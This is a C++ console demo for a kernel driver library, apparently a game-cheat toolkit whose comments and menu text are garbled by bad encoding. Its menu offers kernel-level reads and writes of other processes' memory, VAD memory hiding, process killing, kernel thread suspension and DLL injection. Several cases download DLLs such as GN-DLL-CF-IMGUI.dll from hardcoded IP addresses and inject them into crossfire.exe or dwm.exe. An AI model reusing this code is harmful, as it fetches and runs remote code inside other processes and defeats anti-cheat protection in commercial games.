//////////////////////////////////////////////////////////////////////////////////////////////////////////
//										Demo���򣬲�������ʱ�򵥵ĵ���ʾ��
//////////////////////////////////////////////////////////////////////////////////////////////////////////
#include "main.h"
#include "CrashDump/CrashDump.h"

#include "../GN-Driver-Lib/Driver/Driver.h"
#pragma comment(lib,"Driver/GN-Driver-Lib.lib")

#define OutputDebugStringA_1Param(fmt,var) {CHAR sOut[256];CHAR sfmt[50];sprintf_s(sfmt,"%s%s","",fmt);sprintf_s(sOut,(sfmt),var);OutputDebugStringA(sOut);}
#define OutputDebugStringA_2Param(fmt,var1,var2) {CHAR sOut[256];CHAR sfmt[50];sprintf_s(sfmt,"%s%s","",fmt);sprintf_s(sOut,(sfmt),var1,var2);OutputDebugStringA(sOut);}
#define OutputDebugStringA_3Param(fmt,var1,var2,var3) {CHAR sOut[256];CHAR sfmt[50];sprintf_s(sfmt,"%s%s","",fmt);sprintf_s(sOut,(sfmt),var1,var2,var3);OutputDebugStringA(sOut);}

Driver drv;
std::string dll_buffer;
int dll_buffer_size = 0;


//BOOL UpPermissions()
//{
//	HANDLE hToken;
//	TOKEN_PRIVILEGES pTP;
//	LUID uID;
//	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
//	{
//		MessageBox(NULL, L"��ʼ����������Ȩ�޷�������", L"��ܰ��ʾ", 0);
//		return FALSE;
//	}
//	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &uID))
//	{
//		MessageBox(NULL, L"��������Ȩ�޷�������", L"��ܰ��ʾ", 0);
//		return FALSE;
//	}
//	pTP.PrivilegeCount = 1;
//	pTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
//	pTP.Privileges[0].Luid = uID;
//	if (!AdjustTokenPrivileges(hToken, FALSE, &pTP, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
//	{
//		MessageBox(NULL, L"��������Ȩ��ʱ��������", L"��ܰ��ʾ", 0);
//		return FALSE;
//	}
//	return TRUE;
//}

void Menu()
{
	printf("\n\n");
	printf("0:��������\n");
	printf("1:ж������\n");
	printf("3:ͨ���ں�ģ�����ƻ�ȡ�ں˵�ַ\n");
	printf("4:�����ڴ�����\n");
	printf("5:�����ڴ���������\n");
	printf("6:������ͨ�ڴ�\n");
	printf("7:�������ڴ�ByCR3\n");
	printf("8:���������ڴ�ByCR3\n");
	printf("9:�����������ڴ�ByCR3\n");
	printf("10:д�����ڴ�ByCR3\n");
	printf("11:д�������ڴ�ByCR3\n");
	printf("12:д���������ڴ�ByCR3\n");
	printf("13:д�ֽ����ڴ�ByCR3\n");
	printf("14:�������ڴ�ByMDL\n");
	printf("15:���������ڴ�ByMDL\n");
	printf("16:���ֽڼ��ڴ�ByMDL\n");
	printf("17:д�����ڴ�ByMDL\n");
	printf("18:д�������ڴ�ByMDL\n");
	printf("19:д�ֽ����ڴ�ByMDL\n");
	printf("20:����ע��\n");
	printf("21:VAD�����ڴ�\n");
	printf("22:��������\n");
	printf("23:ɱ������\n");
	printf("24:ע��dwm\n");
	printf("25:ɾ������exe�ļ�\n");
	printf("26:�����ڴ�vad����\n");
	printf("28:��ͣ�ں��߳�\n");
	printf("29:����ע��\n");
	printf("30:����\n");
	printf("31:ע��\n");

}

int main()
{
	static bool first_call_statu = false;
	if (!first_call_statu)
	{
		CrashDump crash_dump;
		first_call_statu = true;
	}
	Menu();
	int select = 0;
	scanf("%d", &select);
	switch (select)
	{
	case 0:
	{
		//GetCurrentDirectoryA(4096, drv.sysfilepath);
		//strcat(drv.sysfilepath, "\\GN-Driver.sys");
		//char* driver_file_buffer = (char*)malloc(1024 * 1024 * 3);
		//int driver_file_buffer_size = 0;
		//int driver_file_buffer_http_head = 0;
		//driver_file_buffer_size = drv.DownLoadFile("112.18.159.36:456", "/RemoteFile/sys/GN-Driver.sys", driver_file_buffer, &driver_file_buffer_http_head, drv.sysfilepath);
		//if (driver_file_buffer_size > 0)
		//{
		//	sprintf_s(drv.sysfilename, "GN-Driver.sys");
		//	//drv.MyClearService(drv.sysfilename);
		//	drv.InstallSYS(drv.sysfilename, drv.sysfilepath);
		//}
		//else
		//	MessageBoxA(NULL, "��������ʧ�ܣ��ļ��·�ʧ��,�����������ӣ���", "����", MB_OK);
		//if (driver_file_buffer)
		//	free(driver_file_buffer);

		bool status = drv.User_Call_InstallSYS();
		//bool status = drv.KdmapperInstallDriver();
		printf("��������״̬��%s\n", status ? "�ɹ�" : "ʧ��");

		break;
	}
	case 1:
	{
		//drv.UninstallSYS(drv.sysfilename);

		printf("����ж��״̬��%s\n", drv.User_Call_UninstallSYS() ? "�ɹ�" : "ʧ��");

		break;
	}
	case 2:
		break;
	case 3:
	{
		WCHAR sys_module_name[500] = { NULL };
		printf("��������Ҫ��ȡ���ں�ģ�����ƣ�\n");
		scanf("%S", &sys_module_name);
		printf("��ַ��%p\n", drv.GetKernelModuleHandle(sys_module_name));
		break;
	}
	case 4:
	{
		ULONG pid = 0;
		ULONG size = 0;
		DWORD64 address = 0;
		ULONG protect_attribute = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("������Ŀ���ַ��\n");
		scanf("%p", &address);
		printf("�������޸ĵ�ַ��С��\n");
		scanf("%d", &size);
		printf("�������µ��ڴ����ԣ�\n");
		scanf("%d", &protect_attribute);
		printf("����ֵ��%d\n", drv.SetMemoryProtectEx(pid, (PVOID)address, size, protect_attribute));
		break;
	}
	case 5:
	{
		ULONG pid = 0;
		ULONG64 address = 0;
		ULONG size = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("������Ŀ���ַ��\n");
		scanf("%p", &address);
		printf("�������޸ĵ�ַ��С��\n");
		scanf("%d", &size);
		printf("����ֵ��%d\n", drv.SetExecutePageEx(pid, address, size));
		break;
	}
	case 6:
	{
		ULONG pid = 0;
		ULONG size = 0;
		ULONG protect = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("�����������ַ��С��\n");
		scanf("%d", &size);
		printf("�����������ַ���ԣ�\n");
		scanf("%d", &protect);
		printf("����ĵ�ַ��%p\n", (DWORD64)drv.AllocMemoryEx(pid, size, protect));
		break;
	}
	case 7:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("�������ȡ��ַ��\n");
		scanf("%p", &address);
		printf("�ں˶�ȡ������ֵ��%p", drv.ReadIntByCR3NoAttachEx(pid, address));
		break;
	}
	case 8:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("�������ȡ��ַ��\n");
		scanf("%p", &address);
		printf("�ں˶�ȡ������ֵ��%p", drv.ReadLongByCR3NoAttachEx(pid, address));
		break;
	}
	case 9:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("�������ȡ��ַ��\n");
		scanf("%p", &address);
		printf("�ں˶�ȡ������ֵ��%f", drv.ReadFloatByCR3NoAttachEx(pid, address));
		break;
	}
	case 10:
	{
		ULONG pid = 0;
		PVOID address = 0;
		PVOID data = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("������д��ĵ�ַ��\n");
		scanf("%p", &address);
		printf("��������Ҫд�������(ʮ����)��\n");
		scanf("%d", &data);
		printf("�Ƿ�ɹ���%s", drv.WriteIntByCR3NoAttachEx(pid, address, (DWORD)data) ? "�ɹ�" : "ʧ��");
		break;
	}
	case 11:
	{
		ULONG pid = 0;
		PVOID address = 0;
		DWORD64 data = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("������д��ĵ�ַ��\n");
		scanf("%p", &address);
		printf("��������Ҫд�������(ʮ������)��\n");
		scanf("%p", &data);
		printf("�Ƿ�ɹ���%s", drv.WriteLongByCR3NoAttachEx(pid, address, (DWORD64)data) ? "�ɹ�" : "ʧ��");
		break;
	}
	case 12:
	{
		ULONG pid = 0;
		PVOID address = 0;
		float data = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("������д��ĵ�ַ��\n");
		scanf("%p", &address);
		printf("��������Ҫд�������(ʮ����С��)��\n");
		scanf("%f", &data);
		printf("�Ƿ�ɹ���%s", drv.WriteFloatByCR3NoAttachEx(pid, address, data) ? "�ɹ�" : "ʧ��");
		break;
	}
	case 13:
	{
		ULONG pid = 0;
		PVOID address = 0;
		BYTE* data = (BYTE*)malloc(1024 * 1024 * 1);

		memset(data, (int)(new BYTE[1024 * 1024 * 1]{ 0xAA }), 1024 * 1024 * 1);
		//BYTE data[5] = { 0xAA,0xBB,0xCC,0xDD,0xFF };
		//printf("���������id��\n");
		scanf("%d", &pid);
		printf("������д��ĵ�ַ��\n");
		scanf("%p", &address);
		printf("д��״̬��%s\n", drv.WriteBytesByCR3NoAttachEx(pid, address, &data, sizeof(data)) ? "�ɹ�" : "ʧ��");
		//drv.WriteBytesByCR3Ex(pid, address, data, sizeof(data));

		free(data);
		break;
	}
	case 14:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("�������ȡ�ĵ�ַ��\n");
		scanf("%p", &address);
		printf("��ȡ�������ݣ�%p\n", drv.ReadIntByMDLEx(pid, address));
		break;
	}
	case 15:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("�������ȡ�ĵ�ַ��\n");
		scanf("%p", &address);
		printf("��ȡ�������ݣ�%p\n", drv.ReadLongByMDLEx(pid, address));
		break;
	}
	case 16:
	{
		ULONG pid = 0;
		PVOID address = 0;
		SIZE_T read_size = 0;
		BYTE read_buffer[8] = { NULL };

		printf("���������id��\n");
		scanf("%d", &pid);
		printf("�������ȡ�ĵ�ַ��\n");
		scanf("%p", &address);
		printf("��������Ҫ��ȡ�ĳ��ȣ�\n");
		scanf("%d", &read_size);

		printf("��ȡ״̬��%s\n", drv.ReadBytesByMDLEx(pid, address, read_size, read_buffer) ? "�ɹ�" : "ʧ��");

		printf("��ȡ�������ݣ�");
		for (int i = 0; i < read_size; i++)
		{
			printf("%02X ", read_buffer[i]);
		}
		printf("\n");

		break;
	}
	case 17:
	{
		ULONG pid = 0;
		PVOID address = 0;
		PVOID data = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("������д��ĵ�ַ��\n");
		scanf("%p", &address);
		printf("��������Ҫд�������(ʮ����)��\n");
		scanf("%d", &data);
		printf("�Ƿ�ɹ���%s", drv.WriteIntByMDLEx(pid, address, (DWORD)data) ? "�ɹ�" : "ʧ��");
		break;
	}
	case 18:
	{
		ULONG pid = 0;
		PVOID address = 0;
		PVOID64 data = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("������д��ĵ�ַ��\n");
		scanf("%p", &address);
		printf("��������Ҫд�������(ʮ������)��\n");
		scanf("%p", &data);
		printf("�Ƿ�ɹ���%s", drv.WriteLongByMDLEx(pid, address, (DWORD64)data) ? "�ɹ�" : "ʧ��");
		break;
	}
	case 19:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("������д��ĵ�ַ��\n");
		scanf("%p", &address);

		BYTE* data = (BYTE*)malloc(1048576);
		for (int i = 0; i < 1048576; i++)
		{
			data[i] = 5;
		}
		printf("д��״̬��%s\n", drv.WriteBytesByMDLEx(pid, address, data, 1048576) ? "�ɹ�" : "ʧ��");
		free(data);

		//BYTE data[6] = { 0x01,0x02,0x03,0x04,0x05,0x06 };
		//printf("д��״̬��%s\n", drv.WriteBytesByMDLEx(pid, address, data, sizeof(data)) ? "�ɹ�" : "ʧ��");

		break;
	}
	case 20:
	{
		//dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/TestDll.dll", dll_buffer, &dll_buffer_http_head);
		//dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/InstrumentationCallbackTest.dll", dll_buffer, &dll_buffer_http_head);
		//dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/ExceptionTest.dll", dll_buffer, &dll_buffer_http_head);
		dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", &dll_buffer);
		//OutputDebugStringA_1Param("[GN]:dll�ļ���С��%d", dll_buffer_size);
		if (dll_buffer_size > 0)
		{
			//ULONG pid = drv.GetProcessPIDW(L"ShadowVolume.exe");
			//if (pid)
			//{
			//	drv.SetProcessID(pid);
			//	DWORD64 modulehandle = (DWORD64)drv.GetUserModuleHandleEx(pid, L"ShadowVolume.exe");
			//	if (modulehandle)
			//	{
			//		//const char* transfer_data = "����Ч�������";
			//		//printf("ע��״̬��%d\n", drv.ReflectiveInject(modulehandle + 0x4FD07, 21, (LPBYTE)(dll_buffer + dll_buffer_http_head), dll_buffer_size, (PVOID)transfer_data, strlen(transfer_data) * 2));
			//		printf("ע��״̬��%d\n", drv.ManualMapInject(modulehandle + 0x4FD07, 21, (LPBYTE)(dll_buffer + dll_buffer_http_head), dll_buffer_size));
			//	}
			//	else
			//		printf("��ȡģ��ʧ�ܣ�\n");
			//}
			//else
			//	printf("��ȡpidʧ��\n");
			
			ULONG pid = drv.GetProcessPIDW(L"crossfire.exe");
			if (pid)
			{
				drv.SetProcessID(pid);
				DWORD64 modulehandle = (DWORD64)drv.GetUserModuleHandleEx(pid, L"crossfire.exe");
				if (modulehandle)
				{
					//const char* transfer_data = "����Ч�������";
					//printf("ע��״̬��%d\n", drv.ReflectiveInject(modulehandle + 0x1BC244, 14, (LPBYTE)(dll_buffer + dll_buffer_http_head), dll_buffer_size, (PVOID)transfer_data, strlen(transfer_data) * 2));
					printf("ע��״̬��%d\n", drv.ManualMapInject(modulehandle + 0x1BC604, 14, (LPBYTE)(dll_buffer.data()), dll_buffer_size));
				}
				else
					printf("��ȡģ��ʧ�ܣ�\n");
			}
			else
				printf("��ȡpidʧ��\n");
		}
		else
			printf("�����ļ�ʧ�ܣ�\n");

		break;
	}
	case 21:
	{
		ULONG pid = 0;
		ULONG64 address = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("��������Ҫ���صĵ�ַ��\n");
		scanf("%p", &address);

		printf("����״̬��%s\n", drv.HideMemoryByVADEx(pid, address, 0) ? "�ɹ�" : "ʧ��");
		break;
	}
	case 22:
	{
		char* driver_file_buffer = (char*)malloc(1024 * 1024 * 3);

		//int file_size = drv.DownLoadFileByCurl("112.18.159.36:456", L"/RemoteFile/sys/GN-Driver.sys", "GN-Driver1.sys");
		//OutputDebugStringA_1Param("[GN]:�ļ���С��%d", file_size);

		//int file_size = drv.DownLoadFileByCurl("112.18.159.36:456", L"/RemoteFile/sys/GN-Driver.sys", driver_file_buffer);
		//OutputDebugStringA_1Param("[GN]:�ļ���С��%d", file_size);
		//if (file_size > 0)
		//{
		//	FILE* fp = nullptr;
		//	fp = fopen("GN-Driver1.sys", "wb");//w:���ı���ʽд�룬wb�Զ����Ʒ�ʽд��
		//	fwrite(driver_file_buffer, file_size, 1, fp);//д�뵽�ļ�
		//	fclose(fp);
		//}


		if (driver_file_buffer)
			free(driver_file_buffer);

		break;
	}
	case 23:
	{
		ULONG pid = 0;
		printf("��������ɱ���Ľ���id��\n");
		scanf("%d", &pid);
		printf("ɱ������״̬��%s\n", drv.KillProcess(pid) ? "�ɹ�" : "ʧ��");
		break;
	}
	case 24:
	{
		//FARPROC addr = GetProcAddress(GetModuleHandleA("ntdll.dl"), "NtCreateThreadEx");
		//printf("��ַ��%p\n", addr);

		//UpPermissions();

		std::string dwm_dll_file;
		int dwm_dll_file_size = 0;

		//char dll_file_path[4096] = { NULL };
		//wchar_t temp_dll_file_path[4096 * 2];
		//GetCurrentDirectoryA(4096, dll_file_path);
		//strcat(dll_file_path, "\\dwm.dll");
		//OutputDebugStringA_1Param("[GN]:����·����%s", dll_file_path);
		//if (drv.DownLoadFile("112.18.159.26:456", "/RemoteFile/Resource/Resource_D_Debug.dll", dwm_dll_file, &dwm_dll_http_head, dll_file_path) > 0)
		//{
		//	drv.charTowchar(dll_file_path, temp_dll_file_path);
		//	printf("ע��dwm״̬��%s\n", drv.InjectByRemoteThreadEx(drv.GetProcessPIDW(L"dwm.exe"), temp_dll_file_path) ? "�ɹ�" : "ʧ��");
		//}

		dwm_dll_file_size = drv.DownLoadFile("112.18.159.26:456", "/RemoteFile/Resource/Resource_D_Debug.dll", &dwm_dll_file);
		if (dwm_dll_file_size > 0)
		{
			printf("ע��dwm״̬��%s\n", drv.Original_ReflectiveInject(drv.GetProcessPIDW(L"dwm.exe"), dwm_dll_file.data(), dwm_dll_file_size, (PVOID)"Test_Data", strlen("Test_Data") + 1) ? "�ɹ�" : "ʧ��");
		}

		break;
	}
	case 25:
	{
		WCHAR file_path[1024] = { NULL };
		WCHAR exe_file_name[MAX_PATH] = { NULL };

		GetCurrentDirectoryW(1024, file_path);

		printf("������exe�ļ�����\n");
		scanf("%S", exe_file_name);

		wcscat(file_path, L"\\");
		wcscat(file_path, exe_file_name);

		printf("ɾ��״̬��%s\n", drv.DeleteExecuteFile(file_path) ? "�ɹ�" : "ʧ��");

		break;
	}
	case 26:
	{
		ULONG pid = 0;
		ULONG size = 0;
		DWORD64 address = 0;
		ULONG protect_attribute = 0;
		printf("���������id��\n");
		scanf("%d", &pid);
		printf("������Ŀ���ַ��\n");
		scanf("%p", &address);
		//printf("�������޸ĵ�ַ��С��\n");
		//scanf("%d", &size);
		printf("�������µ��ڴ����ԣ�\n");
		scanf("%d", &protect_attribute);
		printf("����ֵ��%d\n", drv.SetMemoryVADProtectionEx(pid, address, 0, protect_attribute));
		break;
	}
	case 28:
	{
		printf("��ͣ�߳�״̬��%s\n", drv.SuspendKernelThread("ntoskrnl.exe","0") ? "�ɹ�" : "ʧ��");
		int tid = 0;
		printf("��������Ҫ��ͣ���߳�id��\n");
		scanf("%d", &tid);
		printf("�߳���ͣ״̬��%s\n", drv.SuspendKernelThreadByID("ntoskrnl.exe", (HANDLE)tid) ? "�ɹ�" : "ʧ��");

		break;
	}
	case 29:
	{
		//printf("��������Ҫע��Ľ���id(ʮ����)��\n");
		//ULONG pid = NULL;
		//scanf("%d", &pid);
				
		//����dll
		std::string dll_file;
		int dll_file_size = 0;
		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-ReflectiveLoader-DLL-Demo.dll", &dll_file);
		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-DLL-PUBG.dll", &dll_file);
		dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", &dll_file);
		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/CF-CheatEngine.dll", &dll_file);
		if (dll_file_size > 0)
			printf("dll���سɹ�\n");
		else
			printf("dll����ʧ�ܣ�\n");

		while (true)
		{
			//HWND game_window_handle = ::FindWindowA("Direct3DWindowClass", "SubD11");
			HWND game_window_handle = ::FindWindowA("CrossFire", "��Խ����");
			if (game_window_handle != NULL)
			{
				//��ȡ��Ϸ��ʵpid
				int game_pid = NULL;
				::GetWindowThreadProcessId(game_window_handle, (LPDWORD)&game_pid);
				//int game_pid = drv->GetProcessPIDW(L"crossfire.exe");
				if (game_pid == NULL)
				{
					::MessageBoxA(::GetActiveWindow(), "δ�ҵ���Ϸ����������Ϸ������ϵͳ������", "����", MB_OK);
					exit(-1);
				}

				//����ע����� 
				DWORD inject_value = drv.InjectByKernelHackThreadMemoryLoadEx(game_pid, (PVOID)dll_file.data(), dll_file_size, 3000, _ReadWriteModle::MDL);
				printf("ע��״̬��%s", inject_value ? "�ɹ�" : "ʧ��");
				break;
			}
		}

		break;
	}
	case 30:
	{
		GetCurrentDirectoryA(4096, drv.sysfilepath);
		strcat(drv.sysfilepath, "\\InjectDriver.sys");
		sprintf_s(drv.sysfilename, "InjectDriver.sys");
		//drv.MyClearService(drv.sysfilename);
		drv.InstallSYS(drv.sysfilename, drv.sysfilepath);
		break;
	}
	case 31:
	{
		//����dll
		std::string dll_file;
		int dll_file_size = 0;
		dll_file_size = drv.DownLoadFile("221.236.23.10:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", &dll_file);
		printf("���ش�С��%d\n", dll_file_size);
		if (dll_file_size <= 0)
		{
			printf("dll����ʧ�ܣ�\n");
			break;
		}

		//�ں�ͨѶ
		ULONG dwWrite;
		PVOID return_buffer = NULL;
		HANDLE hDevice = CreateFile(L"\\\\.\\GN_NewLinker", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		DeviceIoControl(hDevice, CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_IN_DIRECT, FILE_ANY_ACCESS), (PVOID)(dll_file.data()), dll_file_size, &return_buffer, sizeof(return_buffer), &dwWrite, NULL);
		CloseHandle(hDevice);

		break;
	}
	default:
		break;
	}
	main();
	return 0;
}


